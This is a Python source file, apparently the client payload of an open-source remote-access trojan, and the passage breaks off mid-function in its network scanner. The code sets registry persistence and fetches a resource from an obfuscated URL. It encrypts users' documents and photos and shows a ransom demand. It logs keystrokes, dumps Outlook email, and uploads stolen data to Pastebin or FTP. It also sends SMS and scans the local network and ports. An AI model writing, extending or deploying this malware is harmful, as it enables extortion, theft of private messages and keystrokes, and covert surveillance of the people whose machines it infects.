#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

"""
 
 
        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
        ,adPPPPP88 88       88 8b       88 88	        8b       88
        88,    ,88 88       88 "8a,   ,d88 88	        "8a,   ,d88
        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88            `"YbbdP"Y8
                                aa,    ,88 	         aa,    ,88
                                 "Y8bbdP"                 "Y8bbdP'

                                                       88                          ,d
                                                       88                          88
         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
        8PP8888888 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
                    aa,    ,88  aa,    ,88 88                                      "Y888
                     "Y8bbdP"    "Y8bbdP"  88



                            https://github.com/colental/ae
"""

from __future__ import print_function
import os
import sys
import imp
import mss
import time
import json
import zlib
import uuid
import numpy
import base64
import ctypes
import pickle
import Queue
import struct
import socket
import random
import ftplib
import urllib
import urllib2
import zipfile
import functools
import threading
import cStringIO
import subprocess
from twilio.rest import Client
from collections import OrderedDict
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256, HMAC
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.number import long_to_bytes, bytes_to_long
from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
if os.name is 'nt':
    from pyHook import HookManager
    from pythoncom import PumpMessages, CoInitialize
    from win32com.client import Dispatch
    from win32com.shell.shell import ShellExecuteEx
    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
else:
    from pyxhook import HookManager



def config(*arg, **options):
    def decorator(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
        return wrapper
    return decorator




class ClientPayload(object):

    __name__    = 'ClientPayload'
    _abort      = 0
    _debug      = 0
    _config     = {}
    _tasks      = Queue.Queue()
    _lock       = threading.Lock()
    

    def __init__(self, *args, **kwargs):
        self._workers   = OrderedDict()
        self._results   = OrderedDict()
        self._network   = OrderedDict()
        self._session   = OrderedDict()
        self._sysinfo   = self._get_sysinfo()
        self._command   = self._get_command()
        self._startup   = self._get_startup()


    @staticmethod
    def _get_id():
        try:
            return SHA256.new(ClientPayload._get_public_ip() + ClientPayload._get_mac_address()).hexdigest()
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_id.func_name, str(e)))


    @staticmethod
    def _get_platform():
        try:
            return sys.platform
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_platform.func_name, str(e)))


    @staticmethod
    def _get_public_ip():
        try:
            return urllib2.urlopen('http://api.ipify.org').read()
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_public_ip.func_name, str(e)))


    @staticmethod
    def _get_private_ip():
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_private_ip.func_name, str(e)))


    @staticmethod
    def _get_mac_address():
        try:
            return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_mac_address.func_name, str(e)))


    @staticmethod
    def _get_architecture():
        try:
            return int(struct.calcsize('P') * 8)
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_architecture.func_name, str(e)))


    @staticmethod
    def _get_device():
        try:
            return socket.getfqdn(socket.gethostname())
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_device.func_name, str(e)))


    @staticmethod
    def _get_username():
        try:
            return os.getenv('USER', os.getenv('USERNAME'))
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_username.func_name, str(e)))


    @staticmethod
    def _get_administrator():
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_administrator.func_name, str(e)))      


    @staticmethod
    def _get_if_ipv4(address):
        try:
            if socket.inet_aton(str(address)):
                return True
        except:
            return False

    @staticmethod
    def _get_random_var(x=6):
        try:
            return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(x)-1))
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_random_var.func_name, str(e)))


    @staticmethod
    def _get_remote_resource(x):
        try:
            return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_remote_resource.func_name, str(e)))


    @staticmethod            
    def _get_job_status(c):
        try:
            c = time.time() - float(c)
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_job_status.func_name, str(e)))

            
    @staticmethod
    def _get_post_request(url, headers={}, data={}):
        try:
            dat = urllib.urlencode(data)
            req = urllib2.Request(str(url), data=dat) if data else urllib2.Request(url)
            for key, value in headers.items():
                req.headers[key] = value
            return urllib2.urlopen(req).read()
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_post_request.func_name, str(e)))


    @staticmethod
    def _get_windows_alert(text, title):
        try:
            t = threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
            t.daemon = True
            t.start()
            return t
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_windows_alert.func_name, str(e)))


    @staticmethod
    def _get_normalized_data(source):
        try:
            if os.path.isfile(str(source)):
                return open(source, 'rb').read()
            elif hasattr(source, 'getvalue'):
                return source.getvalue()
            elif hasattr(source, 'read'):
                if hasattr(source, 'seek'):
                    source.seek(0)
                return source.read()
            else:
                return bytes(source)
        except Exception as e2:
            ClientPayload.debug("{} error: {}".format(ClientPayload._upload_imgur.func_name, str(e2)))


    @staticmethod
    def _get_registry_key(key_name, key_value, system=False):
        try:
            key_name, key_value = [str(key_name), str(key_value)]
            run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
            SetValueEx(reg_key, key_name, 0, REG_SZ, key_value)
            CloseKey(reg_key)
            if system:
                run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
                SetValueEx(reg_key, '*' + key_name, 0, REG_SZ, key_value)
                CloseKey(reg_key)
            return True
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(str(e)))
        return False


    @staticmethod
    def _get_png_from_data(image):
        try:
            if type(image) == numpy.ndarray:
                width, height = (image.shape[1], image.shape[0])
                data = image.tobytes()
            else:
                width, height = (image.width, image.height)
                data = image.rgb
            line = width * 3
            png_filter = struct.pack('>B', 0)
            scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
            ihdr = [b"", b'IHDR', b"", b""]
            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
            ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
            ihdr[0] = struct.pack('>I', len(ihdr[2]))
            idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
            idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
            idat[0] = struct.pack('>I', len(idat[2]))
            iend = [b"", b'IEND', b"", b""]
            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
            iend[0] = struct.pack('>I', len(iend[2]))
            fileh = cStringIO.StringIO()
            fileh.write(magic)
            fileh.write(b"".join(ihdr))
            fileh.write(b"".join(idat))
            fileh.write(b"".join(iend))
            fileh.seek(0)
            return fileh
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_png_from_data.func_name, str(e)))
            

    @staticmethod
    def _get_server_addr():
        try:
            if not ClientPayload._debug:
                req = urllib2.Request(ClientPayload._config['api']['server']['endpoint'])
                req.headers = {'API-Key': ClientPayload._config['api']['server']['api_key']}
                res = json.loads(urllib2.urlopen(req).read())
                ip  = res[res.keys()[0]][0].get('ip')
                if ClientPayload._get_if_ipv4(ip):
                    return ip
                else:
                    ClientPayload.debug("{} returned invalid IPv4 address: '{}'".format(ClientPayload._get_server_addr.func_name, str(ip)))
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_server_addr.func_name, str(e)))
        return '127.0.0.1'


    @staticmethod
    def _get_emails_as_json(emails):
        try:
            output = OrderedDict()
            while True:
                try:
                    email = emails.GetNext()
                except: break
                if email:
                    sender   = email.SenderEmailAddress.encode('ascii','ignore')
                    message  = email.Body.encode('ascii','ignore')[:100] + '...'
                    subject  = email.Subject.encode('ascii','ignore')
                    received = str(email.ReceivedTime).replace('/','-').replace('\\','')
                    result   = {'from': sender, 'subject': subject, 'message': message}
                    output[received] = result
                else: break
            return output
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_emails_as_json.func_name, str(e)))


    @staticmethod
    def _get_encryption():
        try:
            return 'aes' if bool('AES' in globals() and 'SHA256' in globals() and 'HMAC' in globals()) else 'xor'
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_encryption.func_name, str(e)))


    @staticmethod
    def _get_padded(s, block_size, padding=chr(0)):
        try:
            return bytes(s) + (int(block_size) - len(bytes(s)) % int(block_size)) * bytes(padding)
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_padded.func_name, str(e)))


    @staticmethod
    def _get_blocks(s, block_size):
        try:
            return [s[i * block_size:((i + 1) * block_size)] for i in range(len(s) // block_size)]
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_blocks.func_name, str(e)))


    @staticmethod
    def _get_xor(s, t):
        try:
            return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_xor.func_name, str(e)))


    @staticmethod
    def _get_primes(n):
        try:
            sieve = numpy.ones(n/3 + (n%6==2), dtype=numpy.bool)
            for i in xrange(1,int(n**0.5)/3+1):
                if sieve[i]:
                    k=3*i+1|1
                    sieve[       k*k/3     ::2*k] = False
                    sieve[k*(k-2*(i&1)+4)/3::2*k] = False
            return numpy.r_[2,3,((3*numpy.nonzero(sieve)[0][1:]+1)|1)]
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_primes.func_name, str(e)))


    @staticmethod
    def _get_nth_prime(p):
        try:
            return (ClientPayload._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(ClientPayload._get_primes(i)) == p).next()     
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_nth_prime.func_name, str(e)))


    @staticmethod
    def _get_obfuscated(data):
        try:
            a = bytearray(reversed(bytes(data)))
            b = ClientPayload._get_nth_prime(len(a) + 1)
            c = ClientPayload._get_primes(b)
            return base64.b64encode("".join([(chr(a.pop()) if n in c else os.urandom(1)) for n in xrange(b)]))
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_obfuscated.func_name, str(e)))


    @staticmethod
    def _get_deobfuscated(block):
        try:
            return bytes().join(chr(bytearray(base64.b64decode(bytes(block)))[_]) for _ in ClientPayload._get_primes(len(bytearray(base64.b64decode(bytes(block))))))
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._get_deobfuscated.func_name, str(e)))


    @staticmethod
    @config(block_size=8, key_size=16, num_rounds=32)
    def _encrypt_xor(data, key):
        try:
            data    = ClientPayload._get_padded(data, ClientPayload._encrypt_xor.block_size)
            blocks  = ClientPayload._get_blocks(data, ClientPayload._encrypt_xor.block_size)
            vector  = os.urandom(8)
            result  = [vector]
            for block in blocks:
                block   = ClientPayload._get_xor(vector, block)
                v0, v1  = struct.unpack("!2L", block)
                k       = struct.unpack("!4L", key[:ClientPayload._encrypt_xor.key_size])
                sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
                for round in range(ClientPayload._encrypt_xor.num_rounds):
                    v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                    sum = (sum + delta) & mask
                    v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                output  = vector = struct.pack("!2L", v0, v1)
                result.append(output)
            return base64.b64encode(b"".join(result))
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._encrypt_xor.func_name, str(e)))


    @staticmethod
    @config(block_size=8, key_size=16, num_rounds=32)
    def _decrypt_xor(data, key):
        try:
            data    = base64.b64decode(data)
            blocks  = ClientPayload._get_blocks(data, ClientPayload._decrypt_xor.block_size)
            vector  = blocks[0]
            result  = []
            for block in blocks[1:]:
                v0, v1 = struct.unpack("!2L", block)
                k = struct.unpack("!4L", key[:ClientPayload._decrypt_xor.key_size])
                delta, mask = 0x9e3779b9L, 0xffffffffL
                sum = (delta * ClientPayload._decrypt_xor.num_rounds) & mask
                for round in range(ClientPayload._decrypt_xor.num_rounds):
                    v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                    sum = (sum - delta) & mask
                    v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                decode = struct.pack("!2L", v0, v1)
                output = ClientPayload._get_xor(vector, decode)
                vector = block
                result.append(output)
            return str().join(result).rstrip(chr(0))
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._decrypt_xor.func_name, str(e)))


    @staticmethod
    def _encrypt_aes(plaintext, key):
        try:
            text        = ClientPayload._get_padded(plaintext, AES.block_size)
            iv          = os.urandom(AES.block_size)
            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
            ciphertext  = iv + cipher.encrypt(text)
            hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
            return base64.b64encode(ciphertext + hmac_sha256)
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._encrypt_aes.func_name, str(e)))


    @staticmethod
    def _decrypt_aes(ciphertext, key):
        try:
            ciphertext  = base64.b64decode(ciphertext)
            iv          = ciphertext[:AES.block_size]
            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
            read_hmac   = ciphertext[-SHA256.digest_size:]
            calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            ClientPayload.debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
            return cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(chr(0))
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._decrypt_aes.func_name, str(e)))


    @staticmethod
    def _upload_imgur(source):
        try:
            if not ClientPayload._config['api'].get('imgur'):
                return "No Imgur API Key found"
            
            data = ClientPayload._get_normalized_data(source)
            post = ClientPayload._get_post_request('https://api.imgur.com/3/upload', headers={'Authorization': ClientPayload._config['api']['imgur']['api_key']}, data={'image': base64.b64encode(data), 'type': 'base64'})
            return json.loads(post)['data']['link']
        except Exception as e2:
            ClientPayload.debug("{} error: {}".format(ClientPayload._upload_imgur.func_name, str(e2)))


    @staticmethod
    def _upload_pastebin(source):
        try:
            if 'api_dev_key' in ClientPayload._config['api']['pastebin'] and 'api_user_key' in ClientPayload._config['api']['pastebin']:
                data = ClientPayload._get_normalized_data(source)
                info = {'api_option': 'paste', 'api_paste_code': data}
                info.update({'api_user_key': ClientPayload._config['api']['pastebin']['api_user_key']}) 
                info.update({'api_dev_key' :  ClientPayload._config['api']['pastebin']['api_dev_key']}) 
                paste = ClientPayload._get_post_request('https://pastebin.com/api/api_post.php', data=info)
                return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
            else:
                return "No Pastebin API Key found"
        except Exception as e:
            ClientPayload.debug('{} error: {}'.format(ClientPayload._upload_pastebin.func_name, str(e)))


    @staticmethod
    def _upload_ftp(source, filetype=None):
        try:
            creds = ['hostname','username','password']
            for cred in creds:
                if cred in ClientPayload._config['api']['ftp']:
                    creds.remove(cred)
            if len(creds):
                return "Missing required resource(s) for {}: {}".format(ClientPayload._upload_ftp.func_name, ",".join(creds))
            path  = ''
            local = time.ctime().split()
            if os.path.isfile(str(source)):
                path   = source
                source = open(str(path), 'rb')
            elif hasattr(source, 'seek'):
                source.seek(0)
            else:
                source = cStringIO.StringIO(bytes(source))
            try:
                host = ftplib.FTP(ClientPayload._config['api']['ftp']['hostname'], ClientPayload._config['api']['ftp']['username'], ClientPayload._config['api']['ftp']['password'])
            except:
                return "Upload failed - remote FTP server authorization error: {}".format(str(e))
            addr = ClientPayload._get_public_ip()
            if 'tmp' not in host.nlst():
                host.mkd('/tmp')
            if addr not in host.nlst('/tmp'):
                host.mkd('/tmp/{}'.format(addr))
            if path:
                path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
            else:
                if filetype:
                    filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
                    path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
                else:
                    path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
            stor = host.storbinary('STOR ' + path, source)
            return path
        except Exception as e2:
            ClientPayload.debug("{} error: {}".format(ClientPayload._upload_ftp.func_name, str(e2)))


    @staticmethod
    def _ransom_payment(session_id=None):
        try:
            if os.name is 'nt':
                alert = ClientPayload._get_windows_alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(session_id, ClientPayload._config['ransom']['target_url']), "Windows Alert")
                return "Launched a Windows Message Box with ransom payment information"
            else:
                return "{} does not yet support {} platform".format(ClientPayload._ransom_payment.func_name, sys.platform)
        except Exception as e:
            ClientPayload.debug("{} error: {}".format(ClientPayload._ransom_payment.func_name, str(e)))

                
    def _ransom_encrypt(self, path):
        try:
            if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp']:
                aes_key = SHA256.new(os.urandom(16)).hexdigest()
                ransom  = self._encrypt_file(path, key=aes_key)
                cipher  = PKCS1_OAEP.new(self._session['public_key'])
                key     = base64.b64encode(cipher.encrypt(aes_key))
                task_id = self._task_id(self.ransom.func_name)
                task    = {'task': task_id, 'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?'), 'result': key}
                self._results[task_id] = task
                self._server_send(**task)
        except Exception as e:
            self.debug("{} error: {}".format(self._ransom_encrypt.func_name, str(e)))


    def _ransom_decrypt(self, args):
        try:
            path, rsa, aes = args
            cipher   = PKCS1_OAEP.new(rsa_key)
            aes_key  = cipher.decrypt(base64.b64decode(aes))
            path     = self._decrypt_file(path, key=aes_key)
            self.debug("{} decrypted".format(path))
        except Exception as e:
            self.debug("{} error: {}".format(self._ransom_decrypt.func_name, str(e)))
                

    def _sms_send(self, phone_number, message):
        try:
            phone_number = '+{}'.format(str().join([i for i in str(phone_number) if i.isdigit()]))
            if len(phone_number) != 11:
                return "Error: invalid phone number - full 10 digit number required (must include country code)"
            url = 'https://api.twilio.com/2010-04-01/Accounts/{}/Messages'.format(ClientPayload._config['api']['twilio']('account_sid'))
            c   = twilio.rest.Client(ClientPayload._config['api']['twilio'].get('account_sid'), ClientPayload._config['api']['twilio'].get('auth_token'))
            c.api.account.messages.create(to=phone_number, from_=ClientPayload._config['phone_number'], body=message)
            return "SUCCESS: text message sent to %s" % message
        except Exception as e:
            self.dbeug("{} error: {}".format(self._sms_send.func_name, str(e)))


    def _sms_read(*args, **kwargs):
        try:
            return "Reading SMS text messages is still in development. Try again later"
        except Exception as e:
            self.debug("{} error: {}".format(self._sms_read.func_name, str(e)))


    def _email_dump(self, mode=None, **kwargs):
        try:
            CoInitialize()
            outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = self._get_emails_as_json(inbox.Items)
            return self._upload_ftp(json.dumps(self.email.inbox, indent=2)) if 'ftp' in str(mode) else self._upload_pastebin(json.dumps(self.email.inbox, indent=2))
        except Exception as e2:
            self.debug("{} error: {}".format(self._email_dump.func_name, str(e2)))


    def _email_read(self, *args, **kwargs):
        try:
            CoInitialize()
            outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = self._get_emails_as_json(inbox.Items)
            if len(emails):
                output = OrderedDict()
                for k, v in emails.items():
                    if len(json.dumps(output, indent=2)) < 2000:
                        output[k] = v
                    else:
                        return json.dumps(output, indent=2) + '\ncontinued...'
                return json.dumps(output, indent=2)
            else:
                return "No unread messages"
        except Exception as e:
            self.debug("{} error: {}".format(self._email_read.func_name, str(e)))


    def _email_search(self, string):
        try:
            CoInitialize()
            outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = self._get_emails_as_json(inbox.Items)
            for k,v in emails.items():
                if string not in v.get('message') and string not in v.get('subject') and string not in v.get('from'):
                    emails.pop(k,v)
                return json.dumps(output, indent=2) if len(json.dumps(output)) < 2000 else json.dumps(emails, indent=2)[:1984]+ ' ...\n(continued)'
            return json.dumps(output, indent=2)
        except Exception as e:
            self.debug("{} error: {}".format(self._email_search.func_name, str(e)))


    def _email_count(self, *args, **kwargs):
        try:
            CoInitialize()
            outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = inbox.Items
            return "\n\tEmails in Outlook inbox: %d\n\tEmails dumped from Outlook inbox: %d" % (len(emails), int(self.email.inbox.unfinished_tasks))
        except Exception as e:
            self.debug("{} error: {}".format(self._email_search.func_name, str(e)))


    def _keylogger(self, *args, **kwargs):
        while True:
            try:
                hm = HookManager()
                hm.KeyDown = self._keylogger_event
                hm.HookKeyboard()
                if os.name is 'nt':
                    PumpMessages()
                else:
                    time.sleep(0.1)
            except Exception as e:
                self.debug('{} error: {}'.format(self._keylogger.func_name, str(e)))
                break


    def _keylogger_status(self,  *args, **kwargs):
        try:
            return "Keylogger\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(self.keylogger.mode, self._get_job_status(float(self._workers['keylogger'].name)), self.keylogger.buffer.tell())
        except Exception as e:
            self.debug('{} error: {}'.format(self._keylogger_status.func_name, str(e)))
    

    def _keylogger_manager(self, *args, **kwargs):
        while True:
            try:
                if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
                    result  = self._upload_pastebin(self.keylogger.buffer) if 'ftp' not in args else self._upload_ftp(self.keylogger.buffer, filetype='.txt')
                    task_id = self._task_id(self.keylogger.func_name)
                    task    = {'task': task_id, 'session': self._session['id'], 'client': self._sysinfo['id'], 'command': self.keylogger.func_name, 'result': result}
                    self._results[task_id] = task
                    self.keylogger.buffer.reset()
                else:
                    time.sleep(5)
            except Exception as e:
                self.debug("{} error: {}".format(self._keylogger_manager.func_name, str(e)))
                break

    def _keylogger_event(self, event):
        try:
            if event.WindowName != vars(self.keylogger)['window']:
                vars(self.keylogger)['window'] = event.WindowName
                self.keylogger.buffer.write("\n[{}]\n".format(vars(self.keylogger)['window']))
            if event.Ascii > 32 and event.Ascii < 127:
                self.keylogger.buffer.write(chr(event.Ascii))
            elif event.Ascii == 32:
                self.keylogger.buffer.write(' ')
            elif event.Ascii in (10,13):
                self.keylogger.buffer.write('\n')
            elif event.Ascii == 8:
                self.keylogger.buffer.seek(-1, 1)
                self.keylogger.buffer.truncate()
            else:
                pass
        except Exception as e:
            self.debug('{} error: {}'.format(self._keylogger_event.func_name, str(e)))
        return True


    def _scan_ping(self, host):
        try:
            if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                self._network[host] = {}
                return True
            else:
                return False
        except Exception as e:
            return False


    def _scan_port(self, addr):
        try:
            host = addr[0]
            port = addr[1]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect((host,int(port)))
            data = sock.recv(1024)
            if data and ClientPayload._config['resourcecs'].get('ports'):
                info = ClientPayload._config['resourcecs']['ports']
                data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
                data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...')
                item = {port: {'protocol': info[port]['protocol'], 'service': data, 'state': 'open'}}
            else:
                item = {port: {'protocol': info[port]['protocol'], 'service': info[port]['service'], 'state': 'open'}}
            self._network.get(host).update(item)
        except (socket.error, socket.timeout):
            pass
        except Exception as e:
            self.debug('{} error: {}'.format(self._scan_port.func_name, str(e)))


    def _scan_host(self, host):
        try:
            if self._scan_ping(host):
                for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389,8000,8008,8443,8888]:
                    self._tasks.put_nowait((self._scan_port, (host, port)))
                for x in xrange(10):
                    self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
                    self._workers['scanner-%d' % x].daemon = True
                    self._workers['scanner-%d' % x].start()
                self._task_manager.flag.clear()
                for x in xrange(10):
                    if self._workers['scanner-%d' % x].is_alive():
                        self._workers['scanner-%d' % x].join()
                self._task_manager.flag.set()
            return json.dumps(self._network)
        except Exception as e:
            self.debug('{} error: {}'.format(self._scan_host.func_name, str(e)))


    def _scan_network(self, *args):
        try:
            stub = '.'.join(str(self._sysinfo['private_ip']).split('.')[:-1]) + '.%d'
            lan  = []
            for i in xrange(1,255):
                lan.append(stub % i)
                self._tasks.put_nowait((self._scan_ping, stub % i))
            for _ in xrange(10):
                x = random.randrange(100)
                self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
                self._workers['scanner-%d' % x].setDaemon(True)
                self._workers['scanner-%d' % x].start()
            self._workers['scanner-%d' % x].join()
            for ip in lan:
                self._tasks.put_nowait((self._scan_host, ip))
            for n in xrange(10):
                x = random.randrange(100)
